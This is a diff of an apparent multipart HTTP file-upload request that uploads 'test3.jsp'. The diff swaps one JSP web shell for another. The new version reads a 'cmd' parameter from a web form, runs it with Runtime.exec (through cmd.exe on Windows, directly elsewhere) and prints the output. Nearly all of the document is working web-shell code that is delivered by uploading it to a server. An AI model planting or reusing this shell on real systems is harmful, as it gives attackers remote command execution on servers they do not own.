@@ -22,36 +22,36 @@ Content-Type: application/octet-stream
 Content-Disposition: form-data; name="file"; filename="test3.jsp"
 Content-Type: application/octet-stream
 
-<FORM METHOD=GET ACTION='cmdjsp.jsp'>
-<INPUT name='cmd' type=text>
-<INPUT type=submit value='Run'>
-</FORM>
-
-<%@ page import="java.io.*" %>
+<%@ page import="java.util.*,java.io.*"%>
 <%
-   String cmd = request.getParameter("cmd");
-   String output = "";
-
-   if(cmd != null) {
-      String s = null;
-      try {
-         Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
-         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
-         while((s = sI.readLine()) != null) {
-            output += s;
-         }
-      }
-      catch(IOException e) {
-         e.printStackTrace();
-      }
-   }
 %>
-
+<HTML><BODY>
+Commands with JSP
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
 <pre>
-<%=output %>
+<%
+if (request.getParameter("cmd") != null) {
+    out.println("Command: " + request.getParameter("cmd") + "<BR>");
+    Process p;
+    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
+        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
+    }
+    else{
+        p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+    }
+    OutputStream os = p.getOutputStream();
+    InputStream in = p.getInputStream();
+    DataInputStream dis = new DataInputStream(in);
+    String disr = dis.readLine();
+    while ( disr != null ) {
+    out.println(disr);
+    disr = dis.readLine();
+    }
+}
+%>
 </pre>
-
-
-
-
+</BODY></HTML>
 ------WebKitFormBoundarybFBIeS70tRNHl16T--
